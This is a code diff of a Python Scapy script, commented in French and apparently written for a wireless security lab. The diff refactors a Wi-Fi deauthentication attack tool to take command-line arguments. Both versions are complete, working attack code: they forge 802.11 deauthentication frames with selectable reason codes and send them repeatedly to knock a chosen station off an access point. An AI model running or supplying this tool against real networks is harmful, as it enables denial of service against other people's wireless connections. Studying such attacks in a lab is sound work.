@@ -1,48 +1,33 @@
-from scapy.all import *
+import argparse
 
-# Boucle infinie pour relancer le script (par commodité)
+from scapy.all import *
 from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
 
-while True:
-    interface = input("Define interface :\n")
-    bssid = input("Enter BSSID :\n")
-    client = input("Enter client :\n")
-    deauth_count = input("Enter number of deauth packets to send :\n")
+parser = argparse.ArgumentParser()
+parser.add_argument('-i', '--interface', required=True, help='The interface from which to send the packets.')
+parser.add_argument('--bssid', required=True, metavar='MAC_ADDR', help='MAC address of the AP to be targeted.')
+parser.add_argument('--sta', required=True, metavar='MAC_ADDR',
+                    help='MAC address of the station to be disassociated from the AP.')
+parser.add_argument('-c', '--deauth-count', required=True, type=int, metavar='COUNT',
+                    help='Number of deauthentication packets to send.')
+parser.add_argument('-r', '--reason', required=True, type=int, metavar='CODE', choices=[1, 4, 5, 8],
+                    help='Reason code to use of the packets, one of 1, 4, 5 and 8.')
+args = parser.parse_args()
 
-    print("Choose your reason code :")
-    print("1 - Unspecified")
-    print("4 - Disassioted due to inactivity")
-    print("5 - Disassioted because AP is unable to handle all currently associated stations.")
-    print("8 - Deauthenticated because sending STA is leaving BSS")
+# Ici on définit le sens des reason codes selon ce qui est choisi par l'utilisateur
 
-    reason_code = input("Reason code :\n")
-    reason_code = int(reason_code)
+# Le 1 pourrait aller dans les 2 sens selon nos recherches mais ce sens fonctionne très bien
+if args.reason in (1, 4, 5):
+    src = args.bssid
+    dst = args.sta
+elif args.reason == 8:
+    src = args.sta
+    dst = args.bssid
 
-    # Ici on définit le sens des reason codes selon ce qui est choisi par l'utilisateur
-    # Le 1 pourrait aller dans les 2 sens selon nos recherches mais ce sens fonctionne très bien
-    if reason_code == 1:
-        src = bssid
-        dst = client
+# On construit notre paquet de Deauth
+dot11 = Dot11(type=0, subtype=12, addr1=dst, addr2=src, addr3=args.bssid)
+packet = RadioTap() / dot11 / Dot11Deauth(reason=args.reason)
+packet.show()
 
-    elif reason_code == 4:
-        src = bssid
-        dst = client
-
-    elif reason_code == 5:
-        src = bssid
-        dst = client
-
-    elif reason_code == 8:
-        src = client
-        dst = bssid
-
-    else:
-        print("Error, bad reason code")
-        break
-
-    # On construit notre paquet de Deauth
-    dot11 = Dot11(addr1=dst, addr2=src, addr3=bssid)
-    packet = RadioTap() / dot11 / Dot11Deauth(reason=reason_code)
-
-    # On envoit le paquet n fois (demandé à l'utilisateur)
-    sendp(packet, iface=interface, inter=0.5, count=int(deauth_count))
+# On envoit le paquet n fois (demandé à l'utilisateur)
+sendp(packet, iface=args.interface, inter=0.1, count=args.deauth_count, monitor=True)
